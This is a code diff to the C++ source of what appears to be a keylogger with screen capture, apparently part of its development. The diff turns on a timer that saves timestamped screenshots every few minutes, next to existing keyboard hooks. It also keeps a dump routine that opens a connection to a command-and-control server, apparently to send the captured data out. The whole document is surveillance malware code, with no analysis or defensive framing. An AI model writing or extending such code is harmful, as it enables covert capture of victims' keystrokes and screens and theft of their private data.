@@ -48,14 +48,18 @@ void WriteKeylog()
 // screenshotTimer Handler function
 void SaveScreenshot()
 {
-	Screenshot ss;
-	// ss.Save(a file path that is generated);
+	std::string path = IO::GetOutputPath(true) + Utils::DateTime::Now().GetTimestamp() + ".jpeg";
+	Screenshot ss(path);
+	if (ss.Process())
+	{
+		IO::WriteAppLog("Succesfully Save screenshot to path " + path);
+	}
+	std::cout << "Screenshot Saved to " << path << std::endl;
 }
 
 // dumpTimer Handler function
 void DumpCache()
 {
-	std::cout << "Attempting Dump" << std::endl;
 	// Open connection with comand and control server
 	ClientSocket ccSocket(CC_HOSTNAME, CC_PORT);
 	if (!ccSocket.IsActive())
@@ -115,9 +119,9 @@ int main(int argc, char** argv)
 	IO::WriteAppLog("Log Timer Started");
 
 	// Create and Start Screenshot Timer
-	// Timer screenshotTimer(SaveScreenshot, SS_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
-	// screenshotTimer.Start(true);
-	// IO::WriteAppLog("Screenshot Timer Started");
+	Timer screenshotTimer(SaveScreenshot, SS_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
+	screenshotTimer.Start(true);
+	IO::WriteAppLog("Screenshot Timer Started");
 
 	// Create and Start Dump Timer
 	Timer dumpTimer(DumpCache, DUMP_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
@@ -136,7 +140,7 @@ int main(int argc, char** argv)
 	KeyboardManager::GetInstance().UninstallHooks();
 
 	logTimer.Stop();
-	// screenshotTimer.Stop();
+	screenshotTimer.Stop();
 	dumpTimer.Stop();
 
 	return 0;
